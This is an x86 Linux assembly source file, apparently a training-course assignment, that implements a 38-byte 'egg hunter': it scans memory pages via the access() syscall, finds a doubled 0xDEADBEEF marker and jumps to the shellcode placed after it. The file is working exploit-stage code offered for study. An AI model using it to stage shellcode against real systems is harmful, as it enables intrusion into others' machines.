; SLAE - Assignment #3: Reliable Egg Hunter (Linux/x86) - 38 bytes
; Author:  Julien Ahrens (@MrTuxracer)
; Website:  http://www.rcesecurity.com

global _start			

section .text
_start:
	cld ;just to make sure that scasd is working
	xor edx,edx
	xor ecx,ecx

next_page:
	or dx,0xfff ;add 4095

eggy_search:
	inc edx ;PAGE_SIZE=4096

	;
	; int access(const char *pathname, int mode);
	;
	lea ebx, [edx];,[edx+0x4] ;proper alignment, avoiding SIGSEGV in first scasd

	push 0x21 ;access() syscall
	pop eax
	int 0x80 ;exec sys_access
 
	cmp al,0xf2 
	je next_page ;if page is non-accessible (eax=0xfffffff2), then try next page

	mov eax,0xDEADBEEF ;egg can be non-executable

	mov edi,edx
	scasd ;compare eax and edi
	jne eggy_search

	scasd ;compare eax and edi+0x4
	jne eggy_search

	jmp edi ;execute shellcode
